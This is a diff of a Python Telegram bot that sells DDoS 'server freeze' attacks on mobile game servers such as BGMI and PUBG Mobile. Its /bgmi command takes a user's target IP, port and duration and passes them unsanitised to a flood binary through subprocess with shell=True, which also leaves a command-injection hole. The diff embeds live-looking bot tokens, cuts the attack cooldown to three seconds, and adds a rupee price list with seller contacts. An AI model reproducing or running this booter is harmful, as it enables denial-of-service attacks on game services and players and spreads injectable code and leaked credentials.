@@ -1,16 +1,17 @@
-#!/usr/bin/python3
+#bgmiddoserpython
 
 import telebot
 import subprocess
-import requests
 import datetime
 import os
 
-# insert your Telegram bot token here
-bot = telebot.TeleBot('8115452482:AAFGZj0stnWFbP0-dlAbWKZqSmvSyNAeWm0')
+from keep_alive import keep_alive
+keep_alive()
+# Insert your Telegram bot token here
+bot = telebot.TeleBot('7317455031:AAHy4E_1ZYA7LZN37SKecmMCfbg11Ikok4s')
 
 # Admin user IDs
-admin_id = ["6079943111"]
+admin_id = {"1701707162"}
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -18,8 +19,6 @@ USER_FILE = "users.txt"
 # File to store command logs
 LOG_FILE = "log.txt"
 
-
-# Function to read user IDs from the file
 def read_users():
     try:
         with open(USER_FILE, "r") as file:
@@ -43,8 +42,6 @@ def read_free_users():
     except FileNotFoundError:
         pass
 
-
-# List to store allowed user IDs
 allowed_user_ids = read_users()
 
 # Function to log command to the file
@@ -64,7 +61,7 @@ def clear_logs():
     try:
         with open(LOG_FILE, "r+") as file:
             if file.read() == "":
-                response = "Logs are already cleared. No data found ❌."
+                response = "Logs are already cleared. No data found ."
             else:
                 file.truncate(0)
                 response = "Logs cleared successfully ✅"
@@ -102,7 +99,7 @@ def add_user(message):
         else:
             response = "Please specify a user ID to add 😒."
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "ONLY OWNER CAN USE."
 
     bot.reply_to(message, response)
 
@@ -122,12 +119,12 @@ def remove_user(message):
                         file.write(f"{user_id}\n")
                 response = f"User {user_to_remove} removed successfully 👍."
             else:
-                response = f"User {user_to_remove} not found in the list ❌."
+                response = f"User {user_to_remove} not found in the list ."
         else:
             response = '''Please Specify A User ID to Remove. 
 ✅ Usage: /remove <userid>'''
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "ONLY OWNER CAN USE."
 
     bot.reply_to(message, response)
 
@@ -140,14 +137,14 @@ def clear_logs_command(message):
             with open(LOG_FILE, "r+") as file:
                 log_content = file.read()
                 if log_content.strip() == "":
-                    response = "Logs are already cleared. No data found ❌."
+                    response = "Logs are already cleared. No data found ."
                 else:
                     file.truncate(0)
                     response = "Logs Cleared Successfully ✅"
         except FileNotFoundError:
-            response = "Logs are already cleared ❌."
+            response = "Logs are already cleared ."
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "ONLY OWNER CAN USE."
     bot.reply_to(message, response)
 
  
@@ -169,11 +166,11 @@ def show_all_users(message):
                         except Exception as e:
                             response += f"- User ID: {user_id}\n"
                 else:
-                    response = "No data found ❌"
+                    response = "No data found "
         except FileNotFoundError:
-            response = "No data found ❌"
+            response = "No data found "
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "ONLY OWNER CAN USE."
     bot.reply_to(message, response)
 
 
@@ -186,13 +183,13 @@ def show_recent_logs(message):
                 with open(LOG_FILE, "rb") as file:
                     bot.send_document(message.chat.id, file)
             except FileNotFoundError:
-                response = "No data found ❌."
+                response = "No data found ."
                 bot.reply_to(message, response)
         else:
-            response = "No data found ❌"
+            response = "No data found "
             bot.reply_to(message, response)
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "ONLY OWNER CAN USE."
         bot.reply_to(message, response)
 
 
@@ -207,7 +204,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
+    response = f"{username}, GAME MA JA BOSDK 😂.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -223,8 +220,8 @@ def handle_bgmi(message):
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
-                response = "You Are On Cooldown ❌. Please Wait 5min Before Running The /bgmi Command Again."
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
+                response = "You Are On Cooldown . Please Wait 5min Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -241,13 +238,13 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 200"
+                full_command = f"./bgmi {target} {port} {time} 100"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time} Your plan expires on 01/08/2024"
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
-        response = "❌ You Are Not Authorized To Use This Command ❌."
+        response = " Le bhosdi ke pahle DM kar @BYMENTAL"
 
     bot.reply_to(message, response)
 
@@ -265,11 +262,12 @@ def show_command_logs(message):
                 if user_logs:
                     response = "Your Command Logs:\n" + "".join(user_logs)
                 else:
-                    response = "❌ No Command Logs Found For You ❌."
+                    response = " No Command Logs Found For You ."
         except FileNotFoundError:
             response = "No command logs found."
     else:
-        response = "You Are Not Authorized To Use This Command 😡."
+        response = "Le bhosdi ke pahle DM kar @BYMENTAL"
+
     bot.reply_to(message, response)
 
 
@@ -284,8 +282,6 @@ def show_help(message):
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
-Buy From :- @Itzz_AloneX
-Official Channel :- https://t.me/+ymUhqQdlRiVjOTQ1
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -302,7 +298,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
 🤖Try To Run This Command : /help 
-✅Join :- https://t.me/+ymUhqQdlRiVjOTQ1'''
+'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -320,15 +316,38 @@ def welcome_plan(message):
     user_name = message.from_user.first_name
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
-Vip 🌟 :
--> Attack Time : 180 (S)
-> After Attack Limit : 5 Min
--> Concurrents Attack : 3
+════════════════════
+D-DOS Distribted Denial-of-service
+════════════════════
+ If you want to make your owner bot contact owner @BYMENTAL
 
-Pr-ice List💸 :
-Day-->300 Rs
-Week-->1000 Rs
-Month-->2000 Rs
+↳AVAILABLE GAMES
+✧ Bgmi
+✧ Free fire
+✧ Pubg mobile
+✧ Call of duty
+════════════════════ ↳SUPPORT
+✧ 32 & 64 bit
+✧ Root & Non root
+✧ Android 9 to 15
+✧ Support all device
+════════════════════
+💸PR-ICE LIST💸
+✧ Day ~ 50 rs
+✧ Week ~ 150 rs
+✧ Month ~ 400 rs
+════════════════════
+🗣 Don't play brutal
+    Play safe - id safe
+════════════════════ 
+Fist I want to tell you ddos hack basically server freeze hack you can freez full lobby I can recommended only game use
+
+█▀ █▀█ █▀█ █
+█▄ █▄█ █▄█ █▄
+
+[ 🖇️ Admin by ~ @BYMENTAL 🖇️ ]
+[ 🖇️ Any help ~ @IMGODXOP🖇️ ]
+
 '''
     bot.reply_to(message, response)
 
@@ -365,11 +384,16 @@ def broadcast_message(message):
         else:
             response = "🤖 Please Provide A Message To Broadcast."
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "ONLY OWNER CAN USE."
 
     bot.reply_to(message, response)
 
 
 
 
-bot.polling()
+#bot.polling()
+while True:
+    try:
+        bot.polling(none_stop=True)
+    except Exception as e:
+        print(e)
